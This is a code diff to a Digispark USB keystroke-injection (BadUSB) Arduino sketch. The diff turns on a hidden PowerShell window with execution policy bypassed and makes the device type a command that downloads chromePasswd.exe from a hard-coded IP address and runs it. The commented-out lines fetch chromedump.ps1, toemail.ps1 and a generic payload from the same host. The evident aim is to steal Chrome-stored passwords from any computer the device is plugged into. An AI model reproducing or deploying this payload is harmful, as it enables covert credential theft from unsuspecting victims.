@@ -7,8 +7,8 @@ void setup() {
 }
 
 //uncomment to run live
-  //char mode[] = "powershell -nop -win h -noni -exec bypass";
-  char mode[] = "powershell";
+  char mode[] = "powershell -nop -win h -noni -exec bypass";
+  //char mode[] = "powershell";
   char separator[] = "exit";
 //end live
  
@@ -24,12 +24,8 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  //DigiKeyboard.println("(New-Object Net.WebClient).DownloadString('http://137.184.197.191/qmckdsoqwdnscnaklsccznaksjdn/chromedump.ps1'); chromedump -OutFile '$env:userprofile\\ChromeDump.txt'");
-  DigiKeyboard.print("wget http://137.184.197.191/qmckdsoqwdnscnaklsccznaksjdn/chromedump.ps1 -OutFile $env:userprofile\\chromedump.ps1; start-process powershell.exe $env:userprofile\\chromedump.ps1 -OutFile '$env:userprofile\\ChromeDump.txt'; stop-process -Id $PID");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-
-  //DigiKeyboard.println("(New-Object Net.WebClient).DownloadString('http://137.184.197.191/qmckdsoqwdnscnaklsccznaksjdn/toemail.ps1')");
+  //DigiKeyboard.print("wget http://137.184.197.191/indmeuarquivo.exe -OutFile $env:userprofile\\PAYLOAD.exe; start-process $env:userprofile\\PAYLOAD.exe; stop-process -Id $PID");
+  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://137.184.197.191/qmckdsoqwdnscnaklsccznaksjdn/chromePasswd.exe'; $file = 'chromePasswd.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
   DigiKeyboard.delay(500);
   
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
